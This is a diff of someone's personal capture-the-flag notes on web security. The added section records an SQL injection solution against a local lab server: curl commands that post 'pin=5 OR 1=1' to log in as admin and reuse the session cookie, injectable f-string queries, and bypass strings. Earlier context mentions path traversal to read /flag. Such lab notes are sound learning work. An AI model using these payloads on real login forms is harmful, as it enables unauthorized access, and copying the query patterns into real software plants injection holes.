@@ -87,6 +87,7 @@ $(< "$FILE")
 
 
 ; ===============  Web Security
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; ===    GET URL injection
 ; Here I tricked the server to read /flag (file on the actual OS) through the server
@@ -165,3 +166,25 @@ print(urlenc("../../../flag"))     # %2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67
 
 ; ===    Broken Authentication (CWE-287) (CWE-639)
 ;SMA.: It isn't SQL injection. It was crafting to HTTP GET URL
+
+
+; ===    SQL injection (CWE-89) -> (CWE-943) -> (CWE-74)
+; SMA.: I wish In future I will back to this level and solve it with:
+; https://github.com/sqlmapproject/sqlmap
+; Since I tryied sqlmap when I was a kid for first time...
+;
+
+; curl solution template
+; The first command logs in with the injection and saves the session cookie the server returns to jar.txt (-c).
+curl -c jar.txt -X POST --data-urlencode "account-name=admin" --data-urlencode "pin=5 OR 1=1" http://challenge.localhost/session
+; The second command sends that saved cookie back (-b) with a normal GET, so the server treats you as admin.
+curl -b jar.txt http://challenge.localhost/session
+
+; I used very basic tutorial to solve this level: https://www.w3schools.com/sql/sql_injection.asp
+
+; Drafts
+query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
+query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
+-----
+5 or 1=1
+' or ''='
